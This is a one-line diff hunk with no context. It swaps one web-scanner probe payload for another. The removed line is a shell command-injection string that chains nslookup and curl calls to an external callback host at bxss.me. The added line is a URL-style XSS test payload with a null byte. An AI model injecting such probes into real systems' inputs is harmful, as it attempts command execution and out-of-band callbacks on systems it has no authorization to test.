@@ -1,1 +1,1 @@
-;(nslookup -q=cname hitveeozelaca5a484.bxss.me||curl hitveeozelaca5a484.bxss.me)|(nslookup -q=cname hitveeozelaca5a484.bxss.me||curl hitveeozelaca5a484.bxss.me)&(nslookup -q=cname hitveeozelaca5a484.bxss.me||curl hitveeozelaca5a484.bxss.me)
+HttP://bxss.me/t/xss.html?%00
